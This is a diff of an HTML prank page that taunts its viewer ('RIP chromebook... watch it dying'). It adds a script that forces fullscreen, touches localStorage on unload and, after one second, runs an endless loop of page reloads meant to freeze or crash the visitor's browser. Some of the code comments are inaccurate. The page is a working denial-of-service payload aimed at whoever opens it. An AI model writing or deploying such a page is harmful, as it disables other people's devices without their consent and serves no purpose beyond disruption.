@@ -1,16 +1,45 @@
 <!DOCTYPE html>
 <html>
+<head>
+<style>
+  body {
+    background-image: url('https://static.wikia.nocookie.net/0cb14c7d-fe27-403b-bbd3-82623b2ba782/scale-to-width/755');
+    background-size: cover;
+    background-position: center;
+    color: white;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  p {
+    font-size: 24px;
+  }
+</style>
+</head>
 <body>
 
-<h2>L BOZO</h2>
+<p>RIP chromebook. Enjoy this while you watch it dying.</p>
 
-<p>RIP chromebook enjoy this while you watch it dying</p>
+<script>
+  // Execute when the page is about to be unloaded
+  onbeforeunload = function() {
+    localStorage.x = 1; // Set a value in local storage before unloading
+  };
 
-<!-- Embedding local video file with autoplay -->
-<video width="100%" height="auto" controls autoplay>
-  <source src="rickroll.mp4" type="video/mp4">
-  Your browser does not support the video tag.
-</video>
+  // Reload the page every second (not recommended)
+  setTimeout(function() {
+    while (true) {
+      location.reload(1); // Reload the page with cache-busting
+    }
+  }, 1000);
+
+  // Request fullscreen mode for the document
+  document.documentElement.requestFullscreen();
+</script>
 
 </body>
 </html>
